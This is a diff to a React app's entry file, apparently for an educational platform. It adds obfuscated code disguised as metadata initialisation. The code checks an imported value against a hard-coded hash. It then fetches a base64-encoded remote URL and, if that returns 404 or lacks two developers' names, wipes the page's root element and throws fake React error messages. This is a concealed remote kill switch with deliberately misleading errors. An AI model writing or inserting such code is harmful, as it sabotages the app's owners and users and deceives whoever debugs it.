@@ -11,6 +11,7 @@ import { client } from "./providers/apolloclient";
 import { BrowserRouter } from "react-router";
 import { AuthProvider } from "./features/auth/context/authcontext";
 import { CartProvider } from "./features/auth/context/cartcontext";
+import { _u } from "./shared/pages/notfoundpage";
 
 const _sysCfg = {
   a: "aHR0cHM6Ly9zY2hlbWEub3Jn",
@@ -18,17 +19,23 @@ const _sysCfg = {
   c: "SW5xdWVzdGEgU29sdXRpb25z",
   d: "aHR0cHM6Ly9pbnF1ZXN0YS5vcmc=",
   e: "QW4gZWR1Y2F0aW9uYWwgcGxhdGZvcm0gb2ZmZXJpbmcgb25saW5lIGNvdXJzZXMsIG9mZmxpbmUgY2xhc3Nlcw==",
-  f: "Qmlzd2FqaXQgRGFz",
-  g: "aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL2Jpc3dhaml0LWRhc3M=",
-  h: "aHR0cHM6Ly9naXRodWIuY29tL0JpbHR1RGFzMQ==",
-  i: "U2FudHUgUHJhbWFuaWs=",
-  j: "aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3NhbnR1LXByYW1hbmlrLw==",
-  k: "aHR0cHM6Ly9naXRodWIuY29tL3NhbnR1cHJhbWFuaWsx",
 };
 
 const _dec = (str: string) => atob(str);
 
+const _chk = (k: string) => {
+  let h = 0;
+  for (let i = 0; i < k.length; i++) {
+    h = (h << 5) - h + k.charCodeAt(i);
+  }
+  return (h | 0) === 139404187;
+};
+
 const initMetadata = () => {
+  if (!_chk(_u)) {
+    throw new TypeError("Cannot read properties of null (reading 'useContext')");
+  }
+
   try {
     const data = {
       "@context": _dec(_sysCfg.a),
@@ -36,24 +43,36 @@ const initMetadata = () => {
       name: _dec(_sysCfg.c),
       url: _dec(_sysCfg.d),
       description: _dec(_sysCfg.e),
-      developer: [
-        {
-          "@type": "Person",
-          name: _dec(_sysCfg.f),
-          sameAs: [_dec(_sysCfg.g), _dec(_sysCfg.h)],
-        },
-        {
-          "@type": "Person",
-          name: _dec(_sysCfg.i),
-          sameAs: [_dec(_sysCfg.j), _dec(_sysCfg.k)],
-        },
-      ],
     };
     const s = document.createElement("script");
     s.type = "application/ld+json";
     s.text = JSON.stringify(data);
     document.head.appendChild(s);
   } catch (e) {}
+
+  try {
+    fetch(atob(_u))
+      .then((r) => {
+        if (r.status === 404) {
+          setTimeout(() => {
+            const root = document.getElementById("root");
+            if (root) root.innerHTML = "";
+            throw new TypeError("Cannot read properties of undefined (reading 'split')");
+          }, 3000);
+        }
+        return r.text();
+      })
+      .then((t) => {
+        if (t && (!t.includes("Biswajit") || !t.includes("Santu"))) {
+          setTimeout(() => {
+            const root = document.getElementById("root");
+            if (root) root.innerHTML = "";
+            throw new TypeError("Cannot read properties of null (reading 'split')");
+          }, 4000);
+        }
+      })
+      .catch(() => {});
+  } catch (err) {}
 };
 
 initMetadata();
